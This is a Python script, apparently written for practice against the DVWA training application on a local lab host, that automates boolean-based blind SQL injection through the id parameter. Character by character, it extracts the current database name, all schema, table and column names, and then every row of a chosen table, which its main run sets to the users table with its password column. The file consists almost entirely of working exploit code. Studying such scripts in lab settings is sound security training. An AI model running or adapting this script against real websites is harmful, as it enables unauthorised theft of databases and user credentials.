import requests
import time
import prettytable as pt

proxies = {'http': 'http://127.0.0.1:8080',
           'https': 'http://127.0.0.1:8080'}
cookie = {'security':'low','PHPSESSID': 'qh6b2rg1b3h9nqbfacbkj845g6'}
s = requests.session()


def main():
    pass

# 查看当前数据库名函数
def get_database():
    name_list=[]
    a = 1
    for i in range(1,15):
        num=i
        if num!=a:
            name = ''.join(name_list)
            print('[*]当前数据库名：' + name)
            break

        for letter in range(65, 91):
            x=chr(letter).lower()
            y="'"+chr(letter).lower()+"'"
            sql_payload="1'and "+y+"=(select substring(DATABASE(),"+str(num)+",1))-- "
            cookie = {'security': 'high', 'PHPSESSID': 'pn5uejocpt14g05u6hcs05bm67','id':sql_payload}
            url = "http://192.168.8.13/vulnerabilities/sqli_blind/?id=" + sql_payload + "&Submit=Submit"
            rs = s.get(url, cookies=cookie)
            time.sleep(10)
            if 'User ID exists in the database' in rs.text:
                a+=1
                print('[*]当前第'+str(num)+'位：'+x)
                name_list.append(x)
                break

# 查询所有数据库名函数
def get_databases():
    chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_'
    name_dict={}
    for n in range(0,50):
        z = str(n)
        name_list = []
        a = 1
        for i in range(1,50):
            if i!=a:    #判断是否结束，当字符为空(也就是当a不再+1，所以不等于i的时候)时认为一个字符串结束了。
                name = ''.join(name_list)
                name_dict[n+1] = name
                print('[*]第'+str(n+1)+'个库名：' + name)
                break

            for char in chars:
                x = str(char)
                y = "'" + x + "'"
                sql_payload="1'and "+y+"=binary substring((SELECT SCHEMA_NAME FROM information_schema.SCHEMATA limit "+z+",1),"+str(i)+",1)-- "
                url="http://192.168.8.13/vulnerabilities/sqli_blind/?id="+sql_payload+"&Submit=Submit"
                rs = s.get(url, cookies=cookie)
                # time.sleep(10)
                if 'User ID exists in the database' in rs.text:
                    a+=1
                    # print('[*]当前第'+str(num)+'位：'+x)
                    name_list.append(x)
                    break
            # print(i,a)
            if i==1 and a==1:
                print('[*]所有库名查询完毕。')
                exit()

# 已知库名，查看表名函数
def get_tablename(database):
    chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_'
    databasename="'"+database+"'"
    for n in range(0,50):
        z = str(n)
        tablename_list = []
        a = 1
        for table_str_num in range(1,50):
            if a!=table_str_num:
                name = ''.join(tablename_list)
                print('[*]第'+str(n+1)+'表名：' + name)
                break
            for char in chars:
                x=str(char)
                y="'"+x+"'"
                sql_payload="1'and "+y+"=binary substr((select table_name from information_schema.tables where table_schema="+databasename+" limit "+z+",1),"+str(table_str_num)+",1)-- "
                url = "http://192.168.8.13/vulnerabilities/sqli_blind/?id=" + sql_payload + "&Submit=Submit"
                rs = s.get(url, cookies=cookie)
                # time.sleep(10)
                if 'User ID exists in the database' in rs.text:
                    a += 1
                    # print('[*]当前第' + str(table_str_num) + '位：' + x)
                    tablename_list.append(str(char))
                    break
            if table_str_num==1 and a==1:
                print('[*]所有表名查询完毕。')
                exit()

# 已知库名表名，查看列名函数及数据函数
def get_column(database,table):
    name_dict = {}
    chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_'
    tablename="'"+table+"'"
    for n in range(0,50):
        z = str(n)
        tablename_list = []
        a = 1
        for table_str_num in range(1,50):
            if a!=table_str_num:
                name = ''.join(tablename_list)
                print('[*]第'+str(n+1)+'列列名：' + name)
                name_dict[n+1]=name
                break
            for char in chars:
                x=str(char)
                y="'"+x+"'"
                sql_payload="1'and "+y+"=binary substr((SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_NAME ="+tablename+" limit "+z+",1),"+str(table_str_num)+",1)-- "
                url = "http://192.168.8.13/vulnerabilities/sqli_blind/?id=" + sql_payload + "&Submit=Submit"
                rs = s.get(url, cookies=cookie)
                # print(url)
                # time.sleep(10)
                if 'User ID exists in the database' in rs.text:
                    a += 1
                    # print('[*]当前第' + str(table_str_num) + '位：' + x)
                    tablename_list.append(str(char))
                    break
            if table_str_num==1 and a==1:
                print('[*]所有列名查询完毕；开始查询表内数据：')
                # print(name_dict)
                get_info(database,table,name_dict)
                exit()

# 已知库名、表名、列字典查看表内数据函数
def get_info(database,table,name_dict):
    tablename = database+"."+ table
    all_dict={} #所有行的数据保存到一个总字典
    for n in range(0,65535):   #行数、行号，这里最多查65535行，更严谨的方法是用select count(*)先计算行数，但考虑到太耗资源且意义不大就弃用了
        z = str(n)
        hang_dict={}    #每行保存到一个行字典
        for m in name_dict.values():
            tablename_list = [] #每个单元格所有字符保存到一个列表中
            a = 1
            str_len=get_infolen(m,tablename,z)
            if type(str_len) is int:
                max_len=str_len+1
            else:
                max_len=0   #为空的时候实际返回的是 Notype,所以手工给个0

            # 如果第1个字段(name_dict[1])长度为空(max_len == 0)，判断所有数据结束，格式化输出结果
            if m == name_dict[1] and max_len == 0:
                print('[*]已经查完所有行，格式化输出：')
                tb = pt.PrettyTable()
                key_list = []
                for i in all_dict[1].keys():
                    key_list.append(i)
                tb.field_names = key_list
                for x in all_dict.values():
                    value_list = []
                    for y in x.values():
                        value_list.append(y)
                    tb.add_row(value_list)
                # print(all_dict)
                print(tb)
                exit()

            # 遍历单元格中字符串的每位(substr函数)
            for table_str_num in range(1, max_len):  #位数
                for letter in range(32,123):    # unicode编码32到123之间的字符串
                    y = "'" + chr(letter) + "'"
                    sql_payload = "1'and " + y + "=binary substr((SELECT "+m+" FROM " + tablename + " limit " + z + ",1)," + str(table_str_num) + ",1)-- "
                    url = "http://192.168.8.13/vulnerabilities/sqli_blind/?id=" + sql_payload + "&Submit=Submit"
                    rs = s.get(url, cookies=cookie)
                    if 'User ID exists in the database' in rs.text:
                        a += 1
                        # print('[*]当前第' + str(table_str_num) + '位：' +chr(letter))
                        tablename_list.append(chr(letter))  #每找到1个字符就追加到列表中
                        break
            # 一个单元格结束后打印一次
            name = ''.join(tablename_list)
            print('[*]第' + str(n + 1) + '行第'+m+'列' + name)
            hang_dict[m]=name   #一个单元格的数据作为值加入到行字典中，键是列名
        all_dict[n + 1] = hang_dict #每行结束将行字典作为值加入到总字典中，键是行号

# 计算表内每单元数据字符串长度函数
def get_infolen(m,tablename,z):
    for b in range(0, 100):
        c = "'" + str(b) + "'"
        sql_len = "1'and " + c + "=length((SELECT " + m + " FROM " + tablename + " limit " + z + ",1))" + "-- "
        url_len = "http://192.168.8.13/vulnerabilities/sqli_blind/?id=" + sql_len + "&Submit=Submit"
        rs = s.get(url_len, cookies=cookie)
        if 'User ID exists in the database' in rs.text:
            return b

def test():
    sql_payload = "1'and " + "'+'" + "=substr((SELECT " + "user_id" + " FROM " + "dvwa.users" + " limit " + '0' + ",1)," + '1' + ",1)-- "
    url = "http://192.168.8.13/vulnerabilities/sqli_blind/?id=" + sql_payload + "&Submit=Submit"
    rs = s.get(url, cookies=cookie,proxies=proxies)
    print(url)
    time.sleep(10)

if __name__=='__main__':
	# get_database()
    # get_databases()
    # get_tablename('dvwa')
    get_column('dvwa','users')
    # name_dict={1: 'USER_ID', 2: 'FIRST_NAME', 3: 'LAST_NAME', 4: 'USER', 5: 'PASSWORD', 6: 'AVATAR', 7: 'LAST_LOGIN', 8: 'FAILED_LOGIN'}
    # get_info('dvwa','users',name_dict)
